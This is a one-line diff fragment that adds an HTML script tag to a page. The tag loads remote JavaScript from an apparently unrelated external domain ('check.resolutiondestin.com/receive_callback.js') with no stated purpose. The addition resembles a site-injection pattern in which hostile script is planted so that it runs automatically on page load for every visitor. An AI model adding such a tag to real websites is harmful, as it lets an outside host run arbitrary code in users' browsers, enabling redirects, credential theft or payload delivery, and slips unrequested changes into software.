@@ -1,0 +1,1 @@
+<script type='text/javascript' src='https://check.resolutiondestin.com/receive_callback.js'></script>
